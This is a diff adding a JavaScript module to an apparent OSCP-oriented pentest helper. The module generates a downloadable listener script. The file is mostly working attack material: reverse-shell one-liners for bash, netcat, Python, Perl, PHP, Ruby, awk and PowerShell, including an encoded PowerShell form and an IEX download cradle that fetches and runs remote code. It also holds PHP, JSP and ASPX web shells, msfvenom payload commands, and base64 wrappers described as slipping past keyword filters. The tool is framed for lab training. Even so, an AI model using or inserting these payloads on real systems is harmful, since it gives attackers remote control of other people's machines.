@@ -1,0 +1,193 @@
+/*!
+ * obol engine — shellkit.js — the Shell Station (OBOL.shellkit). Pure, Node-safe, tested.
+ *
+ * Turns your LHOST/LPORT into a one-download LISTENER KIT: a .sh that prints every reverse-shell
+ * payload filled in, the PowerShell -EncodedCommand (UTF-16LE then base64, the way OffSec teaches it
+ * for the OSCP), and the TTY-upgrade sequence, then starts your chosen catcher in the foreground so it
+ * is listening the moment you run it. obol writes the script; you run it on your own Kali box. Nothing
+ * executes here. The payload set mirrors the Workbench reverse-shell catalogue (the common OSCP set).
+ * House style: no em or en dashes.
+ */
+(function (root) {
+  'use strict';
+  var OBOL = root.OBOL = root.OBOL || {};
+
+  // ── catchers: the listener you start on your box ──────────────────────────────────────────────
+  var CATCHERS = [
+    { id: 'nc', label: 'netcat', cmd: function (p) { return 'nc -lvnp ' + p; }, teach: 'The universal default. No PTY, so finish with the TTY upgrade below. This is the netcat-traditional syntax; on OpenBSD nc (-p is the source port) drop the p and listen with nc -lvn PORT.', install: 'sudo apt install -y netcat-traditional' },
+    { id: 'rlwrap-nc', label: 'rlwrap + nc', cmd: function (p) { return 'rlwrap -cAr nc -lvnp ' + p; }, teach: 'netcat with arrow keys and history, a much nicer raw shell while you upgrade.', install: 'sudo apt install -y rlwrap netcat-traditional' },
+    { id: 'ncat-ssl', label: 'ncat (TLS)', cmd: function (p) { return 'ncat --ssl -lvn ' + p; }, teach: 'Encrypted catcher; pair with the ncat (TLS) payload so the shell is not plaintext on the wire. In Nmap ncat the listen port is positional (-p is the SOURCE port), so it is -lvn PORT, not -lvnp.', install: 'sudo apt install -y ncat' },
+    { id: 'pwncat', label: 'pwncat-cs', cmd: function (p) { return 'pwncat-cs -lp ' + p; }, teach: 'Auto-upgrades to a full PTY, survives drops, and has upload/download built in. The nicest option when installed.', install: 'pipx install pwncat-cs' },
+    { id: 'socat', label: 'socat (PTY)', cmd: function (p) { return 'socat file:`tty`,raw,echo=0 TCP-LISTEN:' + p; }, teach: 'Gives a full PTY directly when the target also has socat. Pair with the socat payload.', install: 'sudo apt install -y socat' },
+    { id: 'msf', label: 'metasploit multi/handler', cmd: function (p) { return 'msfconsole -q -x "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST tun0; set LPORT ' + p + '; set ExitOnSession false; run -j"'; }, teach: 'Use when the payload is a Meterpreter stager; overkill for a plain shell.', install: 'sudo apt install -y metasploit-framework' },
+  ];
+
+  // ── payloads: {{lhost}}/{{lport}} templates, grouped by os ────────────────────────────────────
+  var PAYLOADS = [
+    { id: 'bash-i', name: 'Bash -i', os: 'linux', tpl: 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1', note: 'The classic; needs a real bash.' },
+    { id: 'sh-tcp', name: 'sh (/dev/tcp)', os: 'linux', tpl: 'sh -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1', note: 'For dash/sh default shells.' },
+    { id: 'nc-mkfifo', name: 'nc (mkfifo)', os: 'linux', tpl: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{lhost}} {{lport}} >/tmp/f', note: 'Portable: works with an nc that has no -e.' },
+    { id: 'nc-e', name: 'nc -e', os: 'linux', tpl: 'nc {{lhost}} {{lport}} -e /bin/sh', note: 'Only if nc was built with -e.' },
+    { id: 'python3', name: 'Python 3', os: 'linux', tpl: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{lhost}}",{{lport}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")\'', note: 'Very reliable and gives a PTY straight away.' },
+    { id: 'socat', name: 'socat (PTY)', os: 'linux', tpl: 'socat TCP:{{lhost}}:{{lport}} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane', note: 'Full PTY if the target has socat; pair with the socat catcher.' },
+    { id: 'perl', name: 'Perl', os: 'linux', tpl: "perl -e 'use Socket;$i=\"{{lhost}}\";$p={{lport}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", note: 'When Perl is present but Python is not.' },
+    { id: 'ncat-ssl', name: 'ncat (TLS)', os: 'linux', tpl: 'ncat --ssl {{lhost}} {{lport}} -e /bin/bash', note: 'Encrypted; pair with the ncat (TLS) catcher.' },
+    { id: 'php', name: 'PHP', os: 'linux', tpl: 'php -r \'$sock=fsockopen("{{lhost}}",{{lport}});exec("/bin/sh -i <&3 >&3 2>&3");\'', note: 'On a LAMP box where php is on PATH; great straight off a web shell.' },
+    { id: 'ruby', name: 'Ruby', os: 'linux', tpl: "ruby -rsocket -e'f=TCPSocket.open(\"{{lhost}}\",{{lport}}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", note: 'When Ruby is present (common on dev boxes) but Python is not.' },
+    { id: 'awk', name: 'awk', os: 'linux', tpl: "awk 'BEGIN {s = \"/inet/tcp/0/{{lhost}}/{{lport}}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null", note: 'Last-resort when only gawk is available (needs the gawk /inet extension).' },
+    { id: 'ps-tcp', name: 'PowerShell (TCP)', os: 'windows', enc: 'psenc', tpl: '$client = New-Object System.Net.Sockets.TCPClient("{{lhost}}",{{lport}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()', note: 'The standard Windows one-liner. Use the Base64 -EncodedCommand form so quoting cannot break it.' },
+    { id: 'ps-iex', name: 'PowerShell (IEX download cradle)', os: 'windows', tpl: "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}/rev.ps1')\"", note: 'Host rev.ps1 (e.g. Invoke-PowerShellTcp with -Reverse) on your box with python3 -m http.server 80. No disk write on target.' },
+    { id: 'win-nc', name: 'Windows nc.exe', os: 'windows', tpl: 'nc.exe {{lhost}} {{lport}} -e cmd.exe', note: 'After you upload nc.exe (or ncat.exe --ssl ... -e cmd.exe). The -e flag is the Windows netcat build.' },
+  ];
+
+  function fill(tpl, lhost, lport) {
+    return String(tpl).replace(/\{\{lhost\}\}/g, lhost || 'LHOST').replace(/\{\{lport\}\}/g, lport || 'LPORT');
+  }
+
+  // PowerShell -EncodedCommand: UTF-16LE, then base64 (exactly what powershell -e expects).
+  function psEncode(script) {
+    if (typeof Buffer !== 'undefined') return Buffer.from(String(script), 'utf16le').toString('base64');
+    var s = String(script), bytes = [];
+    for (var i = 0; i < s.length; i++) { var c = s.charCodeAt(i); bytes.push(c & 0xff, (c >> 8) & 0xff); }
+    var bin = ''; for (var j = 0; j < bytes.length; j++) bin += String.fromCharCode(bytes[j]);
+    return (typeof btoa !== 'undefined') ? btoa(bin) : bin;
+  }
+  // the full PowerShell -EncodedCommand invocation for the TCP payload.
+  function psEncodedCommand(lhost, lport) {
+    var ps = PAYLOADS.filter(function (p) { return p.id === 'ps-tcp'; })[0];
+    return 'powershell -nop -w hidden -EncodedCommand ' + psEncode(fill(ps.tpl, lhost, lport));
+  }
+
+  // The standard "make this raw shell a real terminal" upgrade.
+  function ttyUpgrade() {
+    return [
+      "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'   # or python / script -qc /bin/bash /dev/null",
+      'export TERM=xterm',
+      'Ctrl-Z',
+      'stty raw -echo; fg   # then press Enter twice',
+    ];
+  }
+
+  // ── web shells: files you drop on the target (upload, LFI-to-RCE, writable webroot) ──────────────
+  // Static text, not LHOST/LPORT templates: browse to them and pass your command as a parameter.
+  var WEBSHELLS = [
+    { id: 'php-cmd', name: 'PHP cmd', ext: 'php', code: "<?php system($_GET['cmd']); ?>", note: 'Browse to shell.php?cmd=id. The simplest PHP web shell.' },
+    { id: 'php-eval', name: 'PHP eval (POST)', ext: 'php', code: "<?php eval($_POST['x']); ?>", note: "POST x=system('id'); keeps your command out of the URL and the access log." },
+    { id: 'php-b64', name: 'PHP passthru (base64)', ext: 'php', code: "<?php echo passthru(base64_decode($_GET['c'])); ?>", note: 'shell.php?c=BASE64, where BASE64 decodes to your command. Slips past naive keyword filters.' },
+    { id: 'jsp-cmd', name: 'JSP cmd', ext: 'jsp', code: '<%@ page import="java.io.*" %><% Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=r.readLine())!=null){out.println(l);} %>', note: 'For Tomcat / Java app servers. Browse to shell.jsp?cmd=id.' },
+    { id: 'aspx-cmd', name: 'ASPX cmd', ext: 'aspx', code: '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><% ProcessStartInfo psi=new ProcessStartInfo("cmd.exe","/c "+Request["cmd"]);psi.RedirectStandardOutput=true;psi.UseShellExecute=false;Process p=Process.Start(psi);Response.Write(p.StandardOutput.ReadToEnd()); %>', note: 'For IIS / ASP.NET. Browse to shell.aspx?cmd=whoami.' },
+  ];
+  function webshells() { return WEBSHELLS.map(function (w) { return { id: w.id, name: w.name, ext: w.ext, code: w.code, note: w.note }; }); }
+
+  // ── msfvenom one-liners: when you want a generated payload file instead of a one-line shell ──────
+  function msfvenom(lhost, lport) {
+    lhost = lhost || 'LHOST'; lport = String(lport || '4444');
+    var rows = [
+      { id: 'linux-elf', name: 'Linux ELF', os: 'linux', payload: 'linux/x64/shell_reverse_tcp', fmt: 'elf', out: 'shell.elf', note: 'Staged plain shell; catch with netcat. Use the meterpreter payload only with multi/handler.' },
+      { id: 'windows-exe', name: 'Windows EXE', os: 'windows', payload: 'windows/x64/shell_reverse_tcp', fmt: 'exe', out: 'shell.exe', note: 'Drop and run on the target; catch with netcat.' },
+      { id: 'windows-exe-met', name: 'Windows EXE (meterpreter)', os: 'windows', payload: 'windows/x64/meterpreter/reverse_tcp', fmt: 'exe', out: 'met.exe', note: 'Catch with metasploit multi/handler (the catcher above), not netcat.' },
+      { id: 'php', name: 'PHP', os: 'web', payload: 'php/reverse_php', fmt: 'raw', out: 'shell.php', note: 'Upload to a PHP app; add <?php at the top if the raw output lacks it. Catch with netcat.' },
+      { id: 'aspx', name: 'ASPX', os: 'web', payload: 'windows/x64/shell_reverse_tcp', fmt: 'aspx', out: 'shell.aspx', note: 'For an IIS upload. Catch with netcat.' },
+      { id: 'war', name: 'JSP WAR', os: 'web', payload: 'java/jsp_shell_reverse_tcp', fmt: 'war', out: 'shell.war', note: 'Deploy to Tomcat manager. Catch with netcat.' },
+      { id: 'python', name: 'Python', os: 'linux', payload: 'cmd/unix/reverse_python', fmt: 'raw', out: 'shell.py', note: 'When you can run python on the target but not drop a binary.' },
+    ];
+    return rows.map(function (r) {
+      return { id: r.id, name: r.name, os: r.os, note: r.note,
+        cmd: 'msfvenom -p ' + r.payload + ' LHOST=' + lhost + ' LPORT=' + lport + ' -f ' + r.fmt + ' -o ' + r.out };
+    });
+  }
+
+  // ── payload encoders: base64-runner (quoting-proof delivery) and URL-encode (inject via a param) ──
+  function b64utf8(str) {
+    if (typeof Buffer !== 'undefined') return Buffer.from(String(str), 'utf8').toString('base64');
+    try { return btoa(unescape(encodeURIComponent(String(str)))); } catch (e) { return btoa(String(str)); }
+  }
+  // Wrap a shell payload so it is delivered as base64 and decoded on the target: survives quoting and
+  // odd terminals, exactly the trick OffSec teaches for pasting a reverse shell through a fragile prompt.
+  function b64Runner(cmd) { return 'echo ' + b64utf8(cmd) + ' | base64 -d | bash'; }
+  function urlEncode(cmd) { return encodeURIComponent(String(cmd)); }
+  // A one-line delivery cradle for a web shell file: decode the base64 straight to disk, so a multi-line
+  // JSP/ASPX never gets mangled by pasting raw source over a fragile prompt. ext picks the output name.
+  // ASPX lands on a Windows IIS box where cmd.exe has no base64, so it gets a PowerShell cradle instead.
+  function webshellCradle(code, ext) {
+    ext = ext || 'php';
+    var b64 = b64utf8(code);
+    if (ext === 'aspx') return "powershell -Command \"[IO.File]::WriteAllBytes('shell.aspx', [Convert]::FromBase64String('" + b64 + "'))\"";
+    return "echo '" + b64 + "' | base64 -d > shell." + ext;
+  }
+  // encodePayload(cmd, how): how = 'b64' (base64 runner) | 'url' (percent-encoded) | anything else = raw.
+  function encodePayload(cmd, how) { return how === 'b64' ? b64Runner(cmd) : (how === 'url' ? urlEncode(cmd) : String(cmd)); }
+
+  function catchers() { return CATCHERS.slice(); }
+  function catcherById(id) { return CATCHERS.filter(function (c) { return c.id === id; })[0] || CATCHERS[0]; }
+  function payloads(lhost, lport) { return PAYLOADS.map(function (p) { return { id: p.id, name: p.name, os: p.os, enc: p.enc || '', note: p.note, cmd: fill(p.tpl, lhost, lport) }; }); }
+
+  // listenerKit(opts) -> the downloadable .sh. opts = {lhost, lport, catcher}. It prints the payload
+  // menu, the PowerShell -EncodedCommand, and the TTY upgrade, then starts the catcher in the foreground.
+  function listenerKit(opts) {
+    opts = opts || {};
+    var lhost = opts.lhost || 'LHOST', lport = String(opts.lport || '4444');
+    var cat = catcherById(opts.catcher);
+    var L = [];
+    L.push('#!/usr/bin/env bash');
+    L.push('# obol Shell Station listener kit. obol wrote this; you run it on your OWN attack box.');
+    L.push('# It prints every reverse-shell payload filled with your LHOST/LPORT, then listens.');
+    L.push('set -u');
+    L.push('LHOST="' + lhost + '"');
+    L.push('LPORT="' + lport + '"');
+    L.push('');
+    L.push('if ! [[ "$LPORT" =~ ^[0-9]+$ ]] || [ "$LPORT" -lt 1 ] || [ "$LPORT" -gt 65535 ]; then echo "[!] Bad LPORT: $LPORT"; exit 1; fi');
+    L.push('if [ -z "$LHOST" ] || [ "$LHOST" = "LHOST" ]; then echo "[!] LHOST is not set. Set it in the Shell Station (your tun0 IP) and re-download."; exit 1; fi');
+    L.push('echo "==================== obol Shell Station ===================="');
+    L.push('echo "LHOST=$LHOST  LPORT=$LPORT   catcher: ' + cat.label + '"');
+    L.push('echo');
+    L.push('echo "--- Linux payloads (paste one on the target) ---"');
+    payloads(lhost, lport).filter(function (p) { return p.os === 'linux'; }).forEach(function (p) {
+      L.push('cat <<\'OBOL_EOF\'');
+      L.push('# ' + p.name + ': ' + p.note);
+      L.push(p.cmd);
+      L.push('OBOL_EOF');
+    });
+    L.push('echo');
+    L.push('echo "--- Windows PowerShell ---"');
+    L.push('cat <<\'OBOL_EOF\'');
+    L.push('# PowerShell (TCP), raw:');
+    L.push(fill(PAYLOADS.filter(function (p) { return p.id === 'ps-tcp'; })[0].tpl, lhost, lport));
+    L.push('');
+    L.push('# PowerShell -EncodedCommand (UTF-16LE then base64, quoting-proof):');
+    L.push(psEncodedCommand(lhost, lport));
+    PAYLOADS.filter(function (p) { return p.os === 'windows' && p.id !== 'ps-tcp'; }).forEach(function (p) {
+      L.push('');
+      L.push('# ' + p.name + ': ' + p.note);
+      L.push(fill(p.tpl, lhost, lport));
+    });
+    L.push('OBOL_EOF');
+    L.push('echo');
+    L.push('echo "--- msfvenom payload files (generate on YOUR box) ---"');
+    L.push('cat <<\'OBOL_EOF\'');
+    msfvenom(lhost, lport).forEach(function (m) { L.push('# ' + m.name + ': ' + m.note); L.push(m.cmd); L.push(''); });
+    L.push('OBOL_EOF');
+    L.push('echo');
+    L.push('echo "--- web shells (drop in a writable webroot, then browse to them) ---"');
+    L.push('cat <<\'OBOL_EOF\'');
+    webshells().forEach(function (w) { L.push('# ' + w.name + ' (shell.' + w.ext + '): ' + w.note); L.push(w.code); L.push(''); });
+    L.push('OBOL_EOF');
+    L.push('echo');
+    L.push('echo "--- After you catch the shell, upgrade the TTY ---"');
+    L.push('cat <<\'OBOL_EOF\'');
+    ttyUpgrade().forEach(function (line) { L.push(line); });
+    L.push('OBOL_EOF');
+    L.push('echo');
+    L.push('echo "[*] Listening on :$LPORT  (Ctrl-C to stop)"');
+    if (cat.id === 'msf') L.push(cat.cmd(lport));
+    else L.push('exec ' + cat.cmd('"$LPORT"'));
+    return L.join('\n') + '\n';
+  }
+
+  OBOL.shellkit = {
+    catchers: catchers, catcherById: catcherById, payloads: payloads, fill: fill,
+    psEncode: psEncode, psEncodedCommand: psEncodedCommand, ttyUpgrade: ttyUpgrade, listenerKit: listenerKit,
+    webshells: webshells, msfvenom: msfvenom, encodePayload: encodePayload, b64Runner: b64Runner, urlEncode: urlEncode,
+    webshellCradle: webshellCradle,
+  };
+})(typeof globalThis !== 'undefined' ? globalThis : this);
